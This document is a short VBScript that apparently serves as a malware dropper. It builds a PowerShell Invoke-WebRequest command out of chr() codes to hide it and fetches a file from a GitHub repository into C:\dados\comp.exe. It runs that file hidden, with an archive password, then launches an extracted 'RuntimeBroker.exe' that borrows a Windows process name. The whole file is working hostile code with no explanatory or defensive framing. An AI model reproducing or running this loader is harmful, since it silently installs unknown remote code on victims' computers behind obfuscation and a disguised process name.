Dim fldr, shl, psCmd1p1, psCmd1p2, psCmd1p3, psCmd1p4

fldr = "C:\dados"
psCmd1p1 = chr(112)+chr(111)+chr(119)+chr(101)+chr(114)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)+" -Command "+chr(34)+chr(73)+chr(110)+chr(118)+chr(111)+chr(107)+chr(101)+chr(45)+chr(87)+chr(101)+chr(98)+chr(82)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)
psCmd1p2 = " https://github.com/wubbalubbatuamaenumasuruba-cloud/r1/raw/refs/heads/main/comp.dat "
psCmd1p3 = chr(45)+chr(79)+chr(117)+chr(116)+chr(70)+chr(105)+chr(108)+chr(101)
psCmd1p4 = " "+fldr+"\comp.exe"+chr(34)

Set shl = CreateObject("WScript.Shell")
shl.Run psCmd1p1+psCmd1p2+psCmd1p3+psCmd1p4, 0
WScript.Sleep 60000 '1min
'cmd ps: Invoke-WebRequest

psCmd1p1 = fldr+"\comp.exe"
psCmd1p2 = " -pPMC2025 -y"
shl.Run psCmd1p1+psCmd1p2, 0
WScript.Sleep 60000 '1min

psCmd1p1 = fldr+"\RuntimeBroker.exe"
shl.Run psCmd1p1, 0